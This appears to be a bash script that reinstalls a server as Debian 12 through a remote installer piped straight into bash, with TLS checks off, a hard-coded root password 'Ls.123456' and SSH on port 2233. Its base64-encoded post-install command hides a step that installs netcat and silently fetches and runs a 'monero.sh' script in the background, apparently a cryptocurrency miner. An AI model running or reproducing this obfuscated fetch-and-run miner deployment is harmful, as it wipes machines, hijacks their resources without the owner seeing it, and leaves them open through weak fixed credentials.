#!/bin/bash


sleep 120
#sleep "$[`od -An -N2 -i /dev/urandom` % 10800 + 10800]"


bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKIyBEZWJpYW4xMisKc3VkbyBhcHQgLXFxeSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxIHx8IGFwdCAtcXF5IHVwZGF0ZSA+L2Rldi9udWxsIDI+JjEKc3VkbyBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMSB8fCBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMQpiYXNoIDwod2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC1xTy0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhbnJ6bWUvZHR5aGZzdHIvbWFpbi9tb25lcm8uc2gpID4vZGV2L251bGwgMj4mMSAm"
